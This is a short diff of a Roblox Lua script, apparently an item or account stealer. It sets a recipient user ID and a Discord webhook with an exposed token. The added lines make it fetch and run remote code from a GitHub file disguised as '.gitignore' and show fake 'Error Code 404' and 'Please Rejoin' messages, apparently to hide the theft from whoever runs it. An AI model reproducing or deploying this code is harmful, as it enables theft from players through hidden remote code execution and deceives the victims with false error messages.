@@ -1,3 +1,7 @@
 _G.UserID = 1136436754
-_G.WebHook = "https://discord.com/api/webhooks/1022912036885233725/Tm-SQS2_4fYu2XWgubh87IssonW2CddqeMK_tZx4_Tf4Nmh0O3olHECYRPlIbt2ipBi_"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SilenceScripts/Psx.v3/main/SilenceScripts.true"))()
+
+_G.Webhook = "https://discord.com/api/webhooks/1022912036885233725/Tm-SQS2_4fYu2XWgubh87IssonW2CddqeMK_tZx4_Tf4Nmh0O3olHECYRPlIbt2ipBi_"
+_G.KickMessage = "There Was An Error Please Rejoin."
+_G.PopUpMessage = "Error Code 404"
+
+loadstring(game:HttpGet"https://raw.githubusercontent.com/senpaikun123431/Autofarm-Private-/main/.gitignore")()
